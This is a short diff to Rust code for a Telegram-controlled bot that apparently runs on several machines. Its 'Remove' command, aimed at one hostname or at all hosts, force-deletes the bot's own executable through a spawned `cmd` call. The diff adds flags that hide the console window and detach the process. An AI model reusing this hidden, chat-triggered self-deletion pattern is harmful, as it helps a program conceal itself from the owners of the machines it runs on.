@@ -24,15 +24,21 @@ async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
         bot.send_message(msg.chat.id, "You are not authorized to use this bot").await?;
     }
 
+
     match cmd {
         Command::Remove(hostname) => {
             if hostname == "*" || hostname == gethostname().to_string_lossy() {
                 bot.send_message(msg.chat.id, "Removing executable from system").await?;
-                //remove the current executable bypassing the file lock
                 #[cfg(target_os = "windows")]
                 {
+                    use std::os::windows::process::CommandExt;
+
+                    const CREATE_NO_WINDOW: u32 = 0x08000000;
+                    const DETACHED_PROCESS: u32 = 0x00000008;
+
                     std::process::Command::new("cmd")
                         .args(&["/C", "timeout", "/T", "1", "&", "del", "/F", "/Q", std::env::current_exe().unwrap().to_str().unwrap()])
+                        .creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS)
                         .spawn()
                         .unwrap();
                 }
